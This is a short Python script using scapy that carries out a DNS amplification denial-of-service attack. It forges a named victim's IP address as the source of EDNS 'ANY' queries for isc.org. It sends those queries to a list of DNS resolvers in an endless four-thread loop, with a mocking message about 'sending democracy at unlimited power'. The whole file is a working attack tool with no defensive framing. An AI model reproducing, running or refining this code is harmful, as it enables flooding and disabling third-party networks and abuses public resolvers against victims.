from scapy.all import *
from sys import argv

def usage():
    print "USAGE: amp.py [interface] [victim ip] [file of dns servers]"

if len(sys.argv) < 4:
    usage()
    sys.exit()
    
with open(sys.argv[3]) as f:
    servers = f.readlines()
    
    
def bomb():
    q= "isc.org"
    i = 0
    while 1:
        try:
            i = (i+1)%len(servers)
            dns = servers[i]
            packet = Ether()/(IP(src=sys.argv[2],dst=dns)/UDP(sport=RandShort())/DNS(id=1000,rd=1,qd=DNSQR(qname=q,qtype="ALL"), ar=DNSRROPT(rclass=4096)))
            sendp(packet,iface=argv[1].strip(), count=1,verbose=0)
        except Exception:
            pass
        
threads = 4      

print "Sending democracy at unlimited power..."
for x in range(0,threads):
	thread.start_new_thread(bomb,())
    
while 1==1:
    pass